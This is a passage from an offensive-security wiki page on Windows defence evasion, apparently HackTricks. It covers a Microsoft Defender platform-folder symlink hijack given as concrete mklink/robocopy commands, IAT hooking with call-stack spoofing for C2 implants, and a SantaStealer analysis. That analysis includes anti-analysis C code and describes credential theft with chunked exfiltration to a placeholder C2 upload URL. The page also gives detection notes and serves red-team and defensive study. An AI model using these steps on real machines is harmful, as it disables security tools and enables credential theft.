- Erwägen Sie, die 8.3-Shortname-Erzeugung auf Volumes, die Security-Tools hosten, zu deaktivieren, falls kompatibel mit Ihrer Umgebung (gründlich testen).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulation von Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wählt die Platform, von der es ausgeführt wird, indem es Unterordner unter:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

aufzählt. Es wählt den Unterordner mit dem lexikografisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet dann die Defender-Serviceprozesse von dort (aktualisiert entsprechend Service-/Registry-Pfade). Diese Auswahl vertraut Verzeichniseinträgen, einschließlich Directory reparse points (Symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder Service-Störung zu erreichen.

Preconditions
- Local Administrator (erforderlich, um Verzeichnisse/Symlinks unter dem Platform-Ordner zu erstellen)
- Fähigkeit, einen Reboot durchzuführen oder die Defender platform re-selection auszulösen (Service-Neustart beim Boot)
- Nur integrierte Tools erforderlich (mklink)

Why it works
- Defender blockiert Schreibzugriffe in seinen eigenen Ordnern, aber seine Platform-Auswahl vertraut Verzeichniseinträgen und wählt die lexikografisch höchste Version, ohne zu validieren, dass das Ziel auf einen geschützten/vertrauten Pfad auflöst.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen symlink zu einem Verzeichnis mit höherer Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry sehen, die diesen Speicherort widerspiegeln.

Post-exploitation options
- DLL sideloading/code execution: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in Defender-Prozessen auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink entfernen, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik für sich genommen keine Privilegieneskalation liefert; sie erfordert Admin-Rechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams can move runtime evasion out of the C2 implant and into the target module itself by hooking its Import Address Table (IAT) and routing selected APIs through attacker-controlled, position‑independent code (PIC). This generalises evasion beyond the small API surface many kits expose (e.g., CreateProcessA), and extends the same protections to BOFs and post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wende den Patch nach Relokationen/ASLR und vor der ersten Verwendung des Imports an. Reflective loaders wie TitanLdr/AceLdr demonstrieren Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC‑sicher; löse die echte API über den ursprünglichen IAT‑Wert, den du vor dem Patchen erfasst hast, oder über LdrGetProcedureAddress.
- Verwende RW → RX‑Übergänge für PIC und vermeide es, beschreib‑ und ausführbare Seiten zurückzulassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine gefälschte Aufrufkette auf (return addresses into benign modules) und dann pivot into the real API.
- Das umgeht Erkennungen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere mit stack cutting/stack stitching‑Techniken, um vor dem API‑Prolog in erwartete Frames zu landen.

Operative Integration
- Prepend the reflective loader to post‑ex DLLs, sodass sich PIC und Hooks automatisch initialisieren, wenn die DLL geladen wird.
- Verwende ein Aggressor‑Script, um Ziel‑APIs zu registrieren, sodass Beacon und BOFs transparent vom gleichen Evasion‑Pfad profitieren, ohne Codeänderungen.

Erkennung/DFIR‑Erwägungen
- IAT‑Integrität: Einträge, die auf non‑image (heap/anon) Adressen auflösen; periodische Verifizierung von Import‑Zeigern.
- Stack‑Anomalien: return addresses, die nicht zu geladenen Images gehören; abrupte Übergänge zu non‑image PIC; inkonsistente RtlUserThreadStart‑Abstammung.
- Loader‑Telemetry: In‑Process‑Schreibvorgänge in die IAT, frühe DllMain‑Aktivität, die Import‑Thunks modifiziert, unerwartete RX‑Regionen, die beim Laden erstellt werden.
- Image‑load Evasion: Bei Hooking von LoadLibrary* verdächtige Ladevorgänge von automation/clr‑Assemblies überwachen, die mit memory masking‑Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective loaders, die IAT‑Patching während des Ladens durchführen (z. B. TitanLdr, AceLdr)
- Memory masking hooks (z. B. simplehook) und stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (z. B. Draugr)

## SantaStealer Tradecraft für Fileless Evasion und Credential Theft

SantaStealer (aka BluelineStealer) zeigt, wie moderne info‑stealers AV bypass, anti‑analysis und credential access in einem einzigen Workflow verbinden.

### Keyboard layout gating & sandbox delay

- Ein Config‑Flag (`anti_cis`) enumerates installierte keyboard layouts via `GetKeyboardLayoutList`. Wenn ein kyrillisches Layout gefunden wird, droppt das Sample einen leeren `CIS`‑Marker und terminiert, bevor Stealers ausgeführt werden, sodass es auf ausgeschlossenen Lokalitäten nie detoniert und gleichzeitig ein Hunting‑Artefakt hinterlässt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mehrschichtige `check_antivm`-Logik

- Variante A durchsucht die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten Rolling-Checksum und vergleicht ihn mit eingebetteten Blocklisten für debuggers/sandboxes; sie wiederholt die Checksumme über den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B inspiziert Systemeigenschaften (process-count floor, recent uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen um Sleeps herum durch, um single-stepping zu entdecken. Jeder Treffer bricht ab, bevor Module gestartet werden.

### Fileless helper + double ChaCha20 reflective loading

- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterates a global `memory_generators` function-pointer table and spawns one thread per enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Each thread writes results into shared buffers and reports its file count after a ~45s join window.
- Once finished, everything is zipped with the statically linked `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` then sleeps 15s and streams the archive in 10 MB chunks via HTTP POST to `http://<C2>:6767/upload`, spoofing a browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Each chunk adds `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, and the last chunk appends `complete: true` so the C2 knows reassembly is done.

## Referenzen

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
